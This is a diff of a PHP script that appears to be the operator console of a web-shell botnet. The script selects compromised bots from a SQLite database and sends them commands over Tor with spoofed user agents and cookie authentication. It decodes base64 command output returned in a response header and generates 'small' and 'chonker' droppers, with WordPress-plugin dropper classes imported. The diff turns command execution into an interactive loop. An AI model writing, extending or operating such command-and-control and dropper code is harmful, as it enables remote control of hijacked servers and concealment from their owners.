@@ -3,6 +3,7 @@ require_once "lib/classes.inc.php";
 
 //crypto
 use crypto\decryptShellResponses\decryptor;
+
 //end crypto
 
 //pipe dream.
@@ -14,6 +15,7 @@ use curlStuff\defaultClient\genericClientExecuteCommands;
 use curlStuff\mainCurl;
 use curlStuff\validateMeMore\talkToMeDamnit;
 use userAgents\agentsList;
+
 //end communications
 
 // might remove this, since tor is what should be used.
@@ -22,11 +24,13 @@ use userAgents\agentsList;
 // droppers
 use new_bots\makeMeSlim\slimDropper;
 use new_bots\wordpressPlugins\makeMeWordPressing;
+
 // end droppers
 
 //graphics and shit
 use logos\art\artisticStuff;
 use logos\menus\mainMenu;
+
 //end graphipcs and shit.
 
 $d = default_config;
@@ -63,7 +67,7 @@ function pagination()
         if (is_numeric($action)) {
             return $action;
         }
-        if ($action ==='n') {
+        if ($action === 'n') {
             if (!$lastPage) {
                 $page++;
                 $lastId = database->grabAndFormatOutput($lastId, $itemsPerPage, "bot");
@@ -82,7 +86,7 @@ function pagination()
             } else {
                 echo "You're on the first page. Cannot go back any further.\n";
             }
-        }elseif ($action === "q"){
+        } elseif ($action === "q") {
             return 0;
         }
     } while ($action !== "q");
@@ -98,73 +102,85 @@ while (true) {
     $c = strtolower(trim(readline("->")));
     switch ($c) {
         case str_starts_with($c, "sys") !== false:
+            system(CLEAR);
             $m->enumSystemMenu();
             $a = new hereEatThis();
             break;
         case str_starts_with($c, "rev") !== false:
+            system(CLEAR);
             $m->reverseConnectionsMenu();
             break;
         case str_starts_with($c, "com") !== false:
+            system(CLEAR);
             // need to add handling into this script for the new script filenames.
-           $selectedEntry = pagination();
+            $selectedEntry = pagination();
             $bot = database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
             $coms = new genericClientExecuteCommands([
-                "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
-                "timeout" => 5,
-                "allow_redirects" => false,
-                "proxy" => [
-                    "http" => $d->tor,
-                    "https" => $d->tor
-                ],
-                "cookies" => true,
-                "protocols" => $bot[0]['proto'],
-                "strict" => false,
-                "referrer" => false,
-                "track-redirects" => true
-            ]
-            );
-            try {
-                $m->commandTypes();
-                $type = readline("Which of the 3 options would you like to select: ");
-                $command = $coms->head($bot[0]['uri'],
-                    [
-                        'headers' => [
-                            "User-Agent" => $bot[0]['agent']
-                        ]
+                    "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
+                    "timeout" => 5,
+                    "allow_redirects" => false,
+                    "proxy" => [
+                        "http" => $d->tor,
+                        "https" => $d->tor
                     ],
-                    [
-                        "cr" => $type,
-                        "command" => readline("What would you like to execute: "),
-                        "uuid" => $bot[0]['uuid'],
-                        "cname" => $bot[0]['cname'],
-                        "cval" => $bot[0]['cvalue'],
-                    ]
-                );
-            }catch (Exception $e){
-                echo $e->getMessage().PHP_EOL;
-                readline("Exception occured....... Press enter to continue.".PHP_EOL);
-                break;
-            }
-            if (!is_null($command->getHeaderLine('D'))){
-                foreach (explode(":", base64_decode($command->getHeaderLine("D"))) as $output){
-                    echo sprintf("\033[0;35m%s\033[0m", str_replace(";", "\n", trim($output))).PHP_EOL;
+                    "cookies" => true,
+                    "protocols" => $bot[0]['proto'],
+                    "strict" => false,
+                    "referrer" => false,
+                    "track-redirects" => true
+                ]
+            );
+            $m->commandTypes();
+            $type = readline("Which of the 3 options would you like to select (this will enter into a loop, so you can continue to execute commands press q to quit): ");
+            do {
+                $bot = database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
+                try {
+                    $action = readline("What would you like to execute (press q or quit to exit this loop): ");
+                    if ($action === "q" || $action === "quit"){
+                        break;
+                    }
+                    if ($action === "clear"){
+                        system(CLEAR);
+                    }
+                    $command = $coms->head($bot[0]['uri'],
+                        [
+                            'headers' => [
+                                "User-Agent" => $bot[0]['agent']
+                            ]
+                        ],
+                        [
+                            "cr" => $type,
+                            "command" => $action,
+                            "uuid" => $bot[0]['uuid'],
+                            "cname" => $bot[0]['cname'],
+                            "cval" => $bot[0]['cvalue'],
+                        ]
+                    );
+                } catch (Exception $e) {
+                    echo $e->getMessage() . PHP_EOL;
+                    readline("Exception occured....... Press enter to continue." . PHP_EOL);
+                    break;
                 }
-                if ($command->getHeaderLine('NewName') !== "") {
+                if (!is_null($command->getHeaderLine('D'))) {
                     database->slopSqlite(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => sprintf("/%s", $command->getHeaderLine('NewName'))]);
+                    foreach (explode(":", base64_decode($command->getHeaderLine("D"))) as $output) {
+                        echo sprintf("\033[0;35m%s\033[0m", str_replace(";", "\n", trim($output))) . PHP_EOL;
+                    }
+                } else {
+                    echo "Command failed successfully....." . PHP_EOL;
                 }
-            }else{
-                echo "Command failed successfully.....".PHP_EOL;
-            }
-            readline("[ !! ] PRESS ENTER TO CONTINUE [ !! ]");
-            break;
+            } while ($action !== "q");
         case str_starts_with($c, "a") !== false:
+            system(CLEAR);
             $m->addHostMenu();
             break;
         case str_starts_with($c, "cr") !== false:
+            system(CLEAR);
             $m->dropperMenu();
             $c = trim(strtolower(readline("-> ")));
             switch ($c) {
                 case str_contains($c, "small") !== false:
+                    system(CLEAR);
                     $act_word = trim(readline("Activation Keyword: "));
                     if (is_null($act_word) or $act_word === "") {
                         $act_word = bin2hex(openssl_random_pseudo_bytes(24));
@@ -180,6 +196,7 @@ while (true) {
                     readline("Press the any key to continue.");
                     break;
                 case str_contains($c, "chonker") !== false:
+                    system(CLEAR);
                     $act_word = trim(readline("Activation Keyword: "));
                     if (is_null($act_word) or $act_word === "") {
                         $act_word = bin2hex(openssl_random_pseudo_bytes(24));
@@ -197,6 +214,7 @@ while (true) {
                     readline("Press the any key to continue.");
                     break;
                 default:
+                    system(CLEAR);
                     $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
                     $a = $trj->generateDropper();
                     database->insertData([
@@ -211,6 +229,7 @@ while (true) {
             }
             break;
         case str_starts_with($c, "ch") !== false:
+            system(CLEAR);
             $m->validateHost();
             $validateMeMore = new talkToMeDamnit();
             try {
@@ -220,28 +239,35 @@ while (true) {
             }
             break;
         case str_starts_with($c, "at") !== false:
+            system(CLEAR);
             $m->addToolMenu();
             break;
         case str_starts_with($c, "lt") !== false:
+            system(CLEAR);
             //@todo need to add pagination here.
             $m->grabToolsMenu();
             break;
         case str_starts_with($c, "gp") !== false:
+            system(CLEAR);
             //@todo need to add pagination here.
             $m->grabProxyMenu();
             break;
         case str_starts_with($c, "r") !== false:
+            system(CLEAR);
             $m->resetProxyMenu();
             break;
         case str_starts_with($c, "gc") !== false:
+            system(CLEAR);
             $m->generateCertMenu();
             break;
         case str_starts_with($c, "o") !== false:
+            system(CLEAR);
             echo "Current Options: " . PHP_EOL;
             print_r($configs);
             readline("Press enter to continue.");
             break;
         case str_starts_with($c, "ac") !== false:
+            system(CLEAR);
             break;
         case str_starts_with($c, "q") !== false:
             system(CLEAR);
